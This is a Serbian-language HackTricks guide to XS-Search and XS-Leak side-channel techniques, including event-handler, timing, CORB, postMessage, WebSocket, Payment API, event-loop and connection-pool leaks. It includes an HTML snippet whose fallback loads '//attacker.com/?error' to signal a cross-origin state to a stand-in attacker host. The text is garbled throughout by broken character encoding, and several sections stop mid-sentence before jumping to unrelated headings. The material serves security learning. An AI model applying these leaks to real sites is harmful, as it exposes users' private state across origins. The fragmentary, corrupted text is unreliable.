# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **oglaÅ¡avanje vaÅ¡e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

XS-Search je metoda koja se koristi za **izvlaÄenje informacija preko granica izvora** iskoriÅ¡Ä‡avanjem ranjivosti boÄnog kanala.

KljuÄni komponenti ukljuÄene u ovaj napad su:

* **Ranjiva veb stranica**: Ciljna veb stranica sa koje se Å¾ele izvuÄ‡i informacije.
* **NapadaÄeva veb stranica**: Zlonamerna veb stranica koju je napadaÄ kreirao, koju Å¾rtva poseÄ‡uje, a na kojoj se nalazi eksploit.
* **Metod ukljuÄivanja**: Tehnika koja se koristi za ukljuÄivanje Ranjive veb stranice u NapadaÄevu veb stranicu (npr. window.open, iframe, fetch, HTML oznaka sa href, itd.).
* **Tehnika curenja**: Tehnike koje se koriste za razlikovanje stanja Ranjive veb stranice na osnovu informacija prikupljenih putem metode ukljuÄivanja.
* **Stanja**: Dva moguÄ‡a stanja Ranjive veb stranice, koja napadaÄ pokuÅ¡ava da razlikuje.
* **Detektovive razlike**: Vidljive varijacije na koje se napadaÄ oslanja kako bi zakljuÄio stanje Ranjive veb stranice.

### Detektovive razlike

Neke aspekte je moguÄ‡e analizirati kako bi se razlikovala stanja Ranjive veb stranice:

* **Statusni kod**: Razlikovanje izmeÄ‘u **razliÄitih HTTP statusnih kodova od preko granica izvora**, kao Å¡to su greÅ¡ke servera, greÅ¡ke klijenta ili greÅ¡ke autentifikacije.
* **KoriÅ¡Ä‡enje API-ja**: Identifikacija **koriÅ¡Ä‡enja Web API-ja** na razliÄitim stranicama, otkrivajuÄ‡i da li preko granica izvora stranica koristi odreÄ‘eni JavaScript Web API.
* **Preusmeravanja**: Otkrivanje navigacija ka razliÄitim stranicama, ne samo HTTP preusmeravanja veÄ‡ i onih pokrenutih JavaScript-om ili HTML-om.
* **SadrÅ¾aj stranice**: Posmatranje **varijacija u telu HTTP odgovora** ili u podresursima stranice, kao Å¡to su **broj ugraÄ‘enih okvira** ili veliÄinske razlike u slikama.
* **HTTP zaglavlje**: UoÄavanje prisustva ili moguÄ‡e vrednosti **odreÄ‘enog zaglavlja HTTP odgovora**, ukljuÄujuÄ‡i zaglavlja poput X-Frame-Options, Content-Disposition i Cross-Origin-Resource-Policy.
* **Vremensko praÄ‡enje**: UoÄavanje doslednih vremenskih razlika izmeÄ‘u dva stanja.

### Metode ukljuÄivanja

* **HTML elementi**: HTML nudi razliÄite elemente za **ukljuÄivanje resursa preko granica izvora**, poput stilskih listova, slika ili skripti, prisiljavajuÄ‡i pregledaÄ da zatraÅ¾i resurs koji nije HTML. Kompilacija potencijalnih HTML elemenata u tu svrhu moÅ¾e se pronaÄ‡i na [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Okviri**: Elementi poput **iframe**, **object** i **embed** mogu direktno ugraditi HTML resurse u napadaÄevu stranicu. Ako stranica **nema zaÅ¡titu okvira**, JavaScript moÅ¾e pristupiti prozoru ugraÄ‘enog resursa putem svojstva contentWindow.
* **IskaÄuÄ‡i prozori**: Metoda **`window.open`** otvara resurs u novoj kartici ili prozoru, pruÅ¾ajuÄ‡i JavaScript-u **ruÄku prozora** za interakciju sa metodama i svojstvima u skladu sa SOP. IskaÄuÄ‡i prozori, Äesto koriÅ¡Ä‡eni u jednokratnoj prijavi, zaobilaze ograniÄenja okvira i kolaÄiÄ‡a ciljnog resursa. MeÄ‘utim, moderni pregledaÄi ograniÄavaju kreiranje iskaÄuÄ‡ih prozora na odreÄ‘ene korisniÄke radnje.
* **JavaScript zahtevi**: JavaScript omoguÄ‡ava direktno slanje zahteva ciljnim resursima koriÅ¡Ä‡enjem **XMLHttpRequests** ili **Fetch API-ja**. Ove metode omoguÄ‡avaju preciznu kontrolu nad zahtevom, kao Å¡to je opcija praÄ‡enja HTTP preusmeravanja.

### Tehnike curenja

* **Rukovalac dogaÄ‘ajima**: Klasika tehnika curenja u XS-Leaks, gde rukovaoci dogaÄ‘ajima poput **onload** i **onerror** pruÅ¾aju informacije o uspehu ili neuspehu uÄitavanja resursa.
* **Poruke o greÅ¡kama**: JavaScript izuzeci ili posebne stranice greÅ¡aka mogu pruÅ¾iti informacije o curenju ili razlikovanju izmeÄ‘u prisustva i odsustva greÅ¡ke.
* **Globalna ograniÄenja**: FiziÄka ograniÄenja pregledaÄa, poput kapaciteta memorije ili drugih nametnutih ograniÄenja pregledaÄa, mogu signalizirati kada je dostignut prag i sluÅ¾iti kao tehnika curenja.
* **Globalno stanje**: Detektovive interakcije sa **globalnim stanjima pregledaÄa** (npr. interfejs History) mogu biti iskoriÅ¡Ä‡ene. Na primer, **broj unosa** u istoriji pregledaÄa moÅ¾e pruÅ¾iti tragove o stranicama preko granica izvora.
* **Performance API**: Ovaj API pruÅ¾a **detalje o performansama trenutne stranice**, ukljuÄujuÄ‡i vremenske podatke o mreÅ¾i za dokument i uÄitane resurse, omoguÄ‡avajuÄ‡i zakljuÄke o traÅ¾enim resursima.
* **ÄŒitljivi atributi**: Neki HTML atributi su **Äitljivi preko granica izvora** i mogu se koristiti kao tehnika curenja. Na primer, svojstvo `window.frame.length` omoguÄ‡ava JavaScript-u da prebroji ugraÄ‘ene okvire na veb stranici preko granica izvora.

## XSinator Alat i Rad

XSinator je automatski alat za **proveru pregledaÄa protiv nekoliko poznatih XS-Leakova** objaÅ¡njenih u njegovom radu: **[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)**

Mo
## **Tehnike zasnovane na vremenu**

Neke od sledeÄ‡ih tehnika koriste vreme kao deo procesa za otkrivanje razlika u moguÄ‡im stanjima veb stranica. Postoji nekoliko naÄina za merenje vremena u veb pregledaÄu.

**Satovi**: API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) omoguÄ‡ava programerima da dobiju merenja visoke rezolucije vremena.\
Postoji znaÄajan broj API-ja koje napadaÄi mogu zloupotrebiti kako bi stvorili implicitne satove: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animacije i drugi.\
Za viÅ¡e informacija: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Tehnike dogaÄ‘aja

### Onload/Onerror

* **Metode ukljuÄivanja**: Okviri, HTML elementi
* **Detektoviva razlika**: Statusni kod
* **ViÅ¡e informacija**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Rezime**: Ako se pokuÅ¡ava uÄitati resurs i onerror/onload dogaÄ‘aji se pokreÄ‡u kada se resurs uspeÅ¡no/neuspeÅ¡no uÄita, moguÄ‡e je saznati statusni kod.
* **Primer koda**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Primer koda pokuÅ¡ava da **uÄita objekte skripti iz JS-a**, ali mogu se koristiti i **druge oznake** poput objekata, stilskih listova, slika, zvukova. TakoÄ‘e, moguÄ‡e je i direktno ubaciti **oznaku** i deklarisati dogaÄ‘aje `onload` i `onerror` unutar oznake (umesto da se ubaci iz JS-a).

Postoji i verzija ovog napada bez skripti:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
U ovom sluÄaju, ako `example.com/404` nije pronaÄ‘en, uÄitaÄ‡e se `attacker.com/?error`.

### Vreme uÄitavanja

* **Metode ukljuÄivanja**: HTML elementi
* **Detektoviva razlika**: Vreme (uglavnom zbog sadrÅ¾aja stranice, statusnog koda)
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Rezime**: [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** moÅ¾e se koristiti za merenje vremena potrebnog za izvrÅ¡avanje zahteva. MeÄ‘utim, mogu se koristiti i druge vrste satova, kao Å¡to je [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) koji moÅ¾e identifikovati zadatke koji traju duÅ¾e od 50 ms.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) joÅ¡ jedan primer:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Vreme uÄitavanja + Prisilni teÅ¾ak zadatak

Ova tehnika je sliÄna prethodnoj, ali **napadaÄ** Ä‡e takoÄ‘e **prisiliti** neku akciju da traje **relevantno vreme** kada je **odgovor pozitivan ili negativan** i izmeriti to vreme.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Vreme istovarivanja/beforeunload

* **Metode ukljuÄivanja**: Frejmovi
* **Detektoviva razlika**: Vreme (uglavnom zbog sadrÅ¾aja stranice, statusnog koda)
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Rezime**: [SharedArrayBuffer sat](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) moÅ¾e se koristiti za merenje vremena potrebnog za izvrÅ¡avanje zahteva. Mogu se koristiti i drugi satovi.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Vreme potrebno za preuzimanje resursa moÅ¾e se izmeriti koriÅ¡Ä‡enjem dogaÄ‘aja [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) i [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event). DogaÄ‘aj **`beforeunload`** se pokreÄ‡e kada pregledaÄ treba da preÄ‘e na novu stranicu, dok se dogaÄ‘aj **`unload`** javlja kada se navigacija zaista odvija. Razlika u vremenu izmeÄ‘u ova dva dogaÄ‘aja moÅ¾e se izraÄunati kako bi se odredilo **vreme koje je pregledaÄ proveo preuzimajuÄ‡i resurs**.

### Vreme merenja okvira sa sandbox-om + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Metode ukljuÄivanja**: Frejmovi
* **Detektoviva razlika**: Vreme (uglavnom zbog sadrÅ¾aja stranice, statusnog koda)
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Rezime**: [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API moÅ¾e se koristiti za merenje vremena potrebnog za izvrÅ¡avanje zahteva. Mogu se koristiti i drugi satovi.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

PrimeÄ‡eno je da u odsustvu [zaÅ¡tite od frejmovanja](https://xsleaks.dev/docs/defenses/opt-in/xfo/), vreme potrebno za uÄitavanje stranice i njenih podresursa preko mreÅ¾e moÅ¾e biti izmereno od strane napadaÄa. Ovo merenje je obiÄno moguÄ‡e jer se `onload` rukovalac frejma pokreÄ‡e tek nakon zavrÅ¡etka uÄitavanja resursa i izvrÅ¡avanja JavaScript koda. Da bi zaobiÅ¡ao varijabilnost koju uvodi izvrÅ¡avanje skripti, napadaÄ moÅ¾e koristiti atribut [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) unutar `<iframe>`. UkljuÄivanje ovog atributa ograniÄava brojne funkcionalnosti, posebno izvrÅ¡avanje JavaScript koda, Äime se olakÅ¡ava merenje koje je uglavnom pod uticajem performansi mreÅ¾e.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + greÅ¡ka + onload

* **Metode ukljuÄivanja**: Okviri
* **Detektoviva razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**:
* **SaÅ¾etak**: Ako moÅ¾ete da izazovete greÅ¡ku na stranici kada se pristupi ispravnom sadrÅ¾aju i da je ispravno uÄitate kada se pristupi bilo kom sadrÅ¾aju, tada moÅ¾ete napraviti petlju da izvuÄete sve informacije bez merenja vremena.
* **Primer koda**:

Pretpostavimo da moÅ¾ete **ubaciti** **stranicu** koja ima **tajni** sadrÅ¾aj **unutar iframe-a**.

MoÅ¾ete **naterati Å¾rtvu da pretraÅ¾uje** datoteku koja sadrÅ¾i "_**flag**_" koristeÄ‡i **iframe** (iskoriÅ¡Ä‡avanje CSRF-a na primer). U okviru iframe-a znate da Ä‡e se _**onload dogaÄ‘aj**_ uvek **izvrÅ¡iti barem jednom**. Zatim moÅ¾ete **promeniti** **URL** iframe-a, ali promeniti samo **sadrÅ¾aj** **hash-a** unutar URL-a.

Na primer:

1. **URL1**: www.napadac.com/xssearch#try1
2. **URL2**: www.napadac.com/xssearch#try2

Ako je prvi URL **uspeÅ¡no uÄitan**, tada, kada se **promeni** **hash** dela URL-a, **onload** dogaÄ‘aj se **neÄ‡e ponovo pokrenuti**. Ali **ako** je stranica imala neku vrstu **greÅ¡ke** prilikom **uÄitavanja**, tada Ä‡e se **onload** dogaÄ‘aj **ponovo pokrenuti**.

Tada moÅ¾ete **razlikovati izmeÄ‘u** stranice koja je **ispravno** uÄitana ili stranice koja ima **greÅ¡ku** prilikom pristupa.

### IzvrÅ¡enje JavaScript-a

* **Metode ukljuÄivanja**: Okviri
* **Detektoviva razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**:
* **SaÅ¾etak**: Ako **stranica** vraÄ‡a **osetljiv** sadrÅ¾aj, **ili** sadrÅ¾aj koji moÅ¾e biti **kontrolisan** od strane korisnika. Korisnik moÅ¾e postaviti **validan JS kod u negativnom sluÄaju**, i svaki pokuÅ¡aj uÄitavanja unutar **`<script>`** oznaka, tako da se u **negativnim** sluÄajevima izvrÅ¡ava **kod napadaÄa**, a u **pozitivnim** sluÄajevima **niÅ¡ta** se ne izvrÅ¡ava.
* **Primer koda**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Metode ukljuÄivanja**: HTML elementi
* **Detektoviva razlika**: Statusni kod i zaglavlja
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **SaÅ¾etak**: **Cross-Origin Read Blocking (CORB)** je sigurnosna mera koja spreÄava uÄitavanje odreÄ‘enih osetljivih resursa sa razliÄitih izvora kako bi se zaÅ¡titilo od napada poput **Spectre**. MeÄ‘utim, napadaÄi mogu iskoristiti njegovo zaÅ¡titno ponaÅ¡anje. Kada odgovor podloÅ¾an **CORB**-u vrati _**CORB zaÅ¡tiÄ‡eni**_ `Content-Type` sa `nosniff` i `2xx` statusnim kodom, **CORB** uklanja telo i zaglavlja odgovora. NapadaÄi koji to posmatraju mogu zakljuÄiti kombinaciju **statusnog koda** (koji ukazuje na uspeh ili greÅ¡ku) i `Content-Type` (koji oznaÄava da li je zaÅ¡tiÄ‡en od **CORB**-a), Å¡to moÅ¾e dovesti do potencijalnog otkrivanja informacija.
* **Primer koda**:

Pogledajte link za viÅ¡e informacija o napadu.

### onblur

* **Metode ukljuÄivanja**: Okviri
* **Detektoviva razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **SaÅ¾etak**: Procure osetljivi podaci iz atributa id ili name.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

MoguÄ‡e je **uÄitati stranicu** unutar **iframe-a** i koristiti **`#id_vrednost`** da bi se stranica **fokusirala na element** iframe-a koji je oznaÄen id-om, zatim, ako je **`onblur`** signal pokrenut, ID element postoji.\
MoÅ¾ete izvrÅ¡iti isti napad sa **`portal`** oznakama.

### postMessage Emitovanja <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Metode ukljuÄivanja**: Okviri, IskaÄuÄ‡i prozori
* **Detektoviva razlika**: KoriÅ¡Ä‡enje API-ja
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **SaÅ¾etak**: Prikupljanje osetljivih informacija iz postMessage ili koriÅ¡Ä‡enje prisustva postMessage-a kao orakula za saznanje o statusu korisnika na stranici
* **Primer koda**: `Bilo koji kod koji sluÅ¡a sve postMessage-ove.`

Aplikacije Äesto koriste [`postMessage` emitovanja](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) za komunikaciju izmeÄ‘u razliÄitih izvora. MeÄ‘utim, ovaj metod moÅ¾e nenamerno otkriti **osetljive informacije** ako parametar `targetOrigin` nije pravilno specificiran, Å¡to omoguÄ‡ava bilo kojem prozoru da primi poruke. Osim toga, sam Äin primanja poruke moÅ¾e delovati kao **orakul**; na primer, odreÄ‘ene poruke mogu biti poslate samo korisnicima koji su prijavljeni. Stoga, prisustvo ili odsustvo ovih poruka moÅ¾e otkriti informacije o stanju ili identitetu korisnika, kao Å¡to je da li su autentifikovani ili ne.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** uz pomoÄ‡ najnaprednijih alata zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}



## Tehnike globalnih ograniÄenja

### WebSocket API

* **Metode ukljuÄivanja**: Okviri, IskaÄuÄ‡i prozori
* **Detektoviva razlika**: KoriÅ¡Ä‡enje API-ja
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **SaÅ¾etak**: Iscrpljivanje ograniÄenja WebSocket veze otkriva broj WebSocket veza stranice sa razliÄitog izvora.
* **Primer koda**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

MoguÄ‡e je identifikovati da li, i koliko, **WebSocket veza ciljne stranice koristi**. To omoguÄ‡ava napadaÄu da otkrije stanja aplikacije i procure informacije vezane za broj WebSocket veza.

Ako jedan **izvor** koristi **maksimalan broj WebSocket** objekata, bez obzira na njihovo stanje veze, kreiranje **novih objekata Ä‡e rezultirati izuzecima JavaScript-a**. Da biste izvrÅ¡ili ovaj napad, web sajt napadaÄa otvara ciljni web sajt u iskaÄuÄ‡em prozoru ili
### Payment API

* **Metode ukljuÄivanja**: Okviri, iskaÄuÄ‡i prozori
* **Detektovljiva razlika**: KoriÅ¡Ä‡enje API-ja
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Rezime**: Detektujte zahtev za plaÄ‡anje jer samo jedan moÅ¾e biti aktivan u isto vreme.
* **Primer koda**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Ova XS-Leak omoguÄ‡ava napadaÄu da **detektuje kada stranica sa razliÄitog porekla pokreÄ‡e zahtev za plaÄ‡anje**.

Zbog toga Å¡to **samo jedan zahtev za plaÄ‡anje moÅ¾e biti aktivan** u isto vreme, ako ciljna veb lokacija koristi Payment Request API, svaki **dalji pokuÅ¡aj koriÅ¡Ä‡enja ovog API-ja Ä‡e propasti**, izazivajuÄ‡i **JavaScript izuzetak**. NapadaÄ moÅ¾e iskoristiti ovo tako Å¡to Ä‡e **periodiÄno pokuÅ¡avati da prikaÅ¾e korisniÄki interfejs za plaÄ‡anje**. Ako jedan pokuÅ¡aj izazove izuzetak, to znaÄi da ciljna veb lokacija trenutno koristi taj API. NapadaÄ moÅ¾e sakriti ove periodiÄne pokuÅ¡aje tako Å¡to Ä‡e odmah zatvoriti korisniÄki interfejs nakon kreiranja.

### Merenje vremena petlje dogaÄ‘aja <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Metode ukljuÄivanja**:
* **Detektovljiva razlika**: Vreme (uglavnom zbog sadrÅ¾aja stranice, statusnog koda)
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Rezime**: Merenje vremena izvrÅ¡avanja veba zloupotrebom jednonitne JS petlje dogaÄ‘aja.
* **Primer koda**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript radi na [jednonitnom modelu konkurentnosti petlje dogaÄ‘aja](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), Å¡to znaÄi da **moÅ¾e izvrÅ¡avati samo jedan zadatak u isto vreme**. Ova karakteristika moÅ¾e biti iskoriÅ¡Ä‡ena kako bi se utvrdilo **koliko vremena kod sa razliÄitog porekla zahteva za izvrÅ¡avanje**. NapadaÄ moÅ¾e meriti vreme izvrÅ¡avanja svog sopstvenog koda u petlji dogaÄ‘aja tako Å¡to kontinuirano Å¡alje dogaÄ‘aje sa fiksnim svojstvima. Ovi dogaÄ‘aji Ä‡e biti obraÄ‘eni kada je bazen dogaÄ‘aja prazan. Ako i druga porekla takoÄ‘e Å¡alju dogaÄ‘aje u isti bazen, **napadaÄ moÅ¾e zakljuÄiti vreme koje je potrebno da se ovi spoljni dogaÄ‘aji izvrÅ¡e posmatrajuÄ‡i kaÅ¡njenja u izvrÅ¡avanju sopstvenih zadataka**. Ovaj metod praÄ‡enja petlje dogaÄ‘aja za kaÅ¡njenja moÅ¾e otkriti vreme izvrÅ¡avanja koda sa razliÄitih porekla, potencijalno otkrivajuÄ‡i osetljive informacije.

{% hint style="warning" %}
Prilikom merenja vremena izvrÅ¡avanja moguÄ‡e je **eliminisati** **mreÅ¾ne faktore** kako bi se dobile **preciznije merenja**. Na primer, uÄitavanjem resursa koje koristi stranica pre njenog uÄitavanja.
{% endhint %}

### Zauzeta petlja dogaÄ‘aja <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Metode ukljuÄivanja**:
* **Detektovljiva razlika**: Vreme (uglavnom zbog sadrÅ¾aja stranice, statusnog koda)
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Rezime**: Jedan naÄin merenja vremena izvrÅ¡avanja veb operacije ukljuÄuje namerno blokiranje petlje dogaÄ‘aja niti, a zatim merenje **koliko vremena je potrebno da petlja dogaÄ‘aja ponovo postane dostupna**. Ubacivanjem blokirajuÄ‡e operacije (poput dugog raÄunanja ili sinhronog API poziva) u petlju dogaÄ‘aja i praÄ‡enjem vremena koje je potrebno za izvrÅ¡avanje sledeÄ‡eg koda, moÅ¾e se zakljuÄiti trajanje zadataka koji su se izvrÅ¡avali u petlji dogaÄ‘aja tokom blokirajuÄ‡eg perioda. Ova tehnika se oslanja na jednonitnu prirodu JavaScript-ove petlje dogaÄ‘aja, gde se zadaci izvrÅ¡avaju sekvenÄno, i moÅ¾e pruÅ¾iti uvid u performanse ili ponaÅ¡anje drugih operacija koje dele istu nit.
* **Primer koda**:

ZnaÄajna prednost tehnike merenja vremena izvrÅ¡avanja zakljuÄavanjem petlje dogaÄ‘aja je njena sposobnost da zaobiÄ‘e **izolaciju sajta**. **Izolacija sajta** je sigurnosna funkcija koja razdvaja razliÄite veb lokacije u odvojene procese, sa ciljem da spreÄi zlonamerne sajtove da direktno pristupaju osetljivim podacima drugih sajtova. MeÄ‘utim, uticajem na vreme izvrÅ¡avanja druge veb lokacije putem deljene petlje dogaÄ‘aja, napadaÄ moÅ¾e indirektno izvuÄ‡i informacije o aktivnostima te veb lokacije. Ova metoda se ne oslanja na direktni pristup podacima druge veb lokacije, veÄ‡ posmatra uticaj aktivnosti te veb lokacije na deljenu petlju dogaÄ‘aja, Äime izbegava zaÅ¡titne barijere koje je uspostavila **izolacija sajta**.

{% hint style="warning" %}
Prilikom merenja vremena izvrÅ¡avanja moguÄ‡e je **eliminisati** **mreÅ¾ne faktore** kako bi se dobile **preciznije merenja**. Na primer, uÄitavanjem resursa koje koristi stranica pre njenog uÄitavanja.
{% endhint %}

### Pool konekcija

* **Metode ukljuÄivanja**: JavaScript zahtevi
* **Detektovljiva razlika**: Vreme (uglavnom zbog sadrÅ¾aja stranice, statusnog koda)
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Rezime**: NapadaÄ moÅ¾e blokirati sve prikljuÄke osim jednog, uÄitati ciljnu veb stranicu i istovremeno uÄitati drugu stranicu, vreme do poÄetka uÄitavanja poslednje stranice je vreme koje je ciljna stranica potroÅ¡ila na uÄitavanje.
* **Primer koda**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

PregledaÄi koriste prikljuÄke za komunikaciju sa serverom, ali zbog ograniÄenih resursa operativnog sistema i hardvera, **pregledaÄi su primorani da nametnu ograniÄenje** na broj istovremenih prikljuÄaka. NapadaÄi mogu iskoristiti ovo ograniÄenje kroz sledeÄ‡e korake:

1. Utvrditi ograniÄenje prikljuÄaka pregledaÄa, na primer, 256 globalnih prikljuÄaka.
2. Zauzeti 255 prikljuÄaka tokom produÅ¾enog perioda pokretanjem 255 zahteva ka razliÄitim hostovima, dizajniranih da odrÅ¾e otvorene veze bez zavrÅ¡etka.
3. Koristiti 256. prikljuÄak za slanje zahteva ka ciljnoj stranici.
4. PokuÅ¡ati 257. zahtev ka drugom hostu. S obzirom da su svi prikljuÄci zauzeti (kao Å¡to je navedeno u koracima 2 i 3), ovaj zahtev Ä‡e
## Tehnike Performance API-ja

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) pruÅ¾a uvid u metrike performansi web aplikacija, dodatno obogaÄ‡ene [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). Resource Timing API omoguÄ‡ava praÄ‡enje detaljnih vremena mreÅ¾nih zahteva, kao Å¡to je trajanje zahteva. Posebno, kada serveri ukljuÄe zaglavlje `Timing-Allow-Origin: *` u svojim odgovorima, dostupni su dodatni podaci poput veliÄine prenosa i vremena pretrage domena.

